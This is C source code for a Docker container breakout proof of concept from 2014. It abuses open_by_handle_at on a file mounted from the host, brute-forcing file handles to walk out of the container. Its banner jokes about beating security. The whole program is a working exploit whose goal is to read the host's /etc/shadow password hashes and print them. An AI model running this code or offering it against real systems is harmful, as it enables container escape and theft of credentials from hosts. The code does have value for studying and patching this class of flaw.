#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>


struct my_file_handle {
	unsigned int handle_bytes;
	int handle_type;
	unsigned char f_handle[8];
};



void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


void dump_handle(const struct my_file_handle *h)
{
	fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
	        h->handle_type);
	for (int i = 0; i < h->handle_bytes; ++i) {
		fprintf(stderr,"0x%02x", h->f_handle[i]);
		if ((i + 1) % 20 == 0)
			fprintf(stderr,"\n");
		if (i < h->handle_bytes - 1)
			fprintf(stderr,", ");
	}
	fprintf(stderr,"};\n");
}


int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
	int fd;
	uint32_t ino = 0;
	struct my_file_handle outh = {
		.handle_bytes = 8,
		.handle_type = 1
	};
	DIR *dir = NULL;
	struct dirent *de = NULL;

	path = strchr(path, '/');

	// recursion stops if path has been resolved
	if (!path) {//path Îª¿Õ
		memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
		oh->handle_type = 1;
		oh->handle_bytes = 8;
		return 1;
	}
	++path;
	fprintf(stderr, "[*] Resolving '%s'\n", path);

	if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
		die("[-] open_by_handle_at");

	if ((dir = fdopendir(fd)) == NULL)
		die("[-] fdopendir");

	for (;;) {
		de = readdir(dir);
		if (!de)
			break;
		fprintf(stderr, "[*] Found %s\n", de->d_name);
		if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
			fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
			ino = de->d_ino;
			break;
		}
	}

	fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");


	if (de) {
		for (uint32_t i = 0; i < 0xffffffff; ++i) {
			outh.handle_bytes = 8;
			outh.handle_type = 1;
			memcpy(outh.f_handle, &ino, sizeof(ino));
			memcpy(outh.f_handle + 4, &i, sizeof(i));

			if ((i % (1<<20)) == 0)
				fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
			if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
				closedir(dir);
				close(fd);
				dump_handle(&outh);
				return find_handle(bfd, path, &outh, oh);
			}
		}
	}

	closedir(dir);
	close(fd);
	return 0;
}


int main()
{
	char buf[0x1000];
	int fd1, fd2;
	struct my_file_handle h;
	struct my_file_handle root_h = {
		.handle_bytes = 8,
		.handle_type = 1,
		.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
	};

	fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
	       "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
	       "[***] If you have pending sec consulting, I'll happily     [***]\n"
	       "[***] forward to my friends who drink secury-tea too!      [***]\n");

	// get a FS reference from something mounted in from outside
	if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
		die("[-] open");

	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
		die("[-] Cannot find valid handle!");

	fprintf(stderr, "[!] Got a final handle!\n");
	dump_handle(&h);

	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
		die("[-] open_by_handle");

	memset(buf, 0, sizeof(buf));
	if (read(fd2, buf, sizeof(buf) - 1) < 0)
		die("[-] read");

	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);

	close(fd2);
	close(fd1);

	return 0;
}